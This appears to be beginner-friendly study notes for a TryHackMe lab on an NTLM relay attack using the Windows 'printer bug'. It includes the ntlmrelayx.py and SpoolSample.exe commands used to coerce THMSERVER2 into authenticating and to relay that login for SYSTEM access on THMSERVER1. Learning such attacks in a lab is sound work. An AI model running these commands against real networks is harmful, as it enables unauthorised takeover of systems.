You want to **hack into a secure Windows machine (THMSERVER1)**.

But you don’t have passwords or tickets.

So you’ll:

- **Trick another machine (THMSERVER2)** into logging into your machine.
- **Catch that login**, and
- **Use it to log into THMSERVER1** — **as if you were THMSERVER2**.

This is called an **NTLM relay attack** using the **"Printer Bug" trick**.

## 🎯 Why This Works (Real-Life Analogy)

Imagine you’re trying to get into a bank (THMSERVER1).

You don’t have access.

But you know **another trusted employee** (THMSERVER2) can go in.

So:

1. You **trick the employee** into showing their badge to you.
2. You **copy their badge info** quickly,
3. Then **flash it at the bank door** — and boom, you're in. 🏦

## 🪜 Step-by-Step in Baby Terms

### ✅ Step 1: Find Who Can Open the Bank Door

We use a tool called **BloodHound** to ask:

> "Which machine account has admin access to THMSERVER1?"
> 

We run a **custom query** that checks if **Machine A** can **admin** **Machine B**.

In our case:

```
THMSERVER2$ → has admin access on → THMSERVER1
```

Perfect! So we can try using THMSERVER2 to break into THMSERVER1.

### ✅ Step 2: Learn About the “Printer Bug”

Windows machines have a service called **Print Spooler** that handles printers.

The **printer bug** lets us tell a computer:

> "Hey, try to print something over there" — and it’ll try to authenticate (log in).
> 

So we use this bug to tell **THMSERVER2**:

> "Try to print something at my IP address" → it logs in to us.
> 

Now we have its **credentials** (machine account: `THMSERVER2$`).

### ✅ Step 3: Catch the Login and Forward It

We use a tool called `ntlmrelayx.py` that:

- **Listens** for logins
- When it gets one from THMSERVER2
- It **forwards** (relays) that login to THMSERVER1

And since THMSERVER2 is trusted on THMSERVER1… 🎉 we get access.

## 👷 All Conditions That Must Be Met

| # | Requirement | What It Means |
| --- | --- | --- |
| 1 | You have a domain account | ✅ You do — you're already inside the network |
| 2 | You can reach THMSERVER2 over the network | ✅ Yes, confirmed |
| 3 | THMSERVER2 has Print Spooler running | ✅ Checked with PowerShell |
| 4 | SMB signing is not enforced | ✅ Checked with Nmap (not required = exploitable) |

## 💻 What We Actually Run (Step-by-Step)

### 🧪 A) On your **Attacker Box** (your fake server)

Listen and wait for authentication:

```bash
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://<THMSERVER1-IP> -debug
```

This waits for THMSERVER2 to try to log in.

### 🖨️ B) On THMWRK1 (a machine you control)

Use the `SpoolSample.exe` file to **trigger the printer bug**:

```
SpoolSample.exe thmserver2.za.tryhackme.loc <Your-Attacker-IP>
```

This tells THMSERVER2:

> "Hey, print something over there"
> 

THMSERVER2 responds by logging into you — you catch the credentials ✅

### 🚪 C) Relay to THMSERVER1

Once the relay happens, `ntlmrelayx.py` will automatically:

- Use THMSERVER2’s credentials
- Log into THMSERVER1
- Run your command (example: `whoami /all`)

This proves you now have SYSTEM access on THMSERVER1 🎯
